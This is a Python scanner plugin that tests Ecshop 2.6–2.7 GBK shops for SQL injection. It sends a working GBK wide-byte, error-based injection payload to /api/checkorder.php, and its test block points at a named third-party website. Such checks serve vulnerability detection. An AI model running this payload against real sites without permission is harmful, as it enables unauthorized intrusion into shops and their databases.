#!/usr/bin/python2.7
#coding:utf-8

import requests
from dummy import *
import re

info = {
	'NAME':'Ecshop 2.6-2.7 GBK SQL Injection',
	'AUTHOR':'wjk',
	'TIME':'20150325',
	'WEB':'',
	'DESCRIPTION':'ecshop 注入通杀2.6-2.7 GBK版本,http://www.shellsec.com/tech/74933.html'
}
opts = {
	'url':'http://testasp.vulnweb.com',	#'target ip'
}
# opts = [
# 	['url','http://testasp.vulnweb.com','target url'],
# ]

def Assign(services):
	if services.has_key('url') and services.has_key('cms') and services['cms'] == 'Ecshop':
		if (services.has_key('cmsversion') and services['cmsversion'] <='2.7' and services['cmsversion'] >='2.6') or services.has_key('cmsversion')==False:
			return True
	return False

def Audit(services):
	url = services['url'] +'/api/checkorder.php?username=%ce%27%20and%201=2%20union%20select%201%20and%20%28select%201%20from%28select%20count%28*%29,concat%28%28Select%20md5(3.1415)%20%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%20%23'
	try:
		ul = requests.get(url)
		qu = ul.text
		m = re.search('63e1f04640e83605c1d177544a5a0488',qu)
		if m:
			security_hole(url)
	except:
		pass
# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	services = {'url':'http://www.eguan.cn'}
	pprint(Audit(services))
	pprint(services)
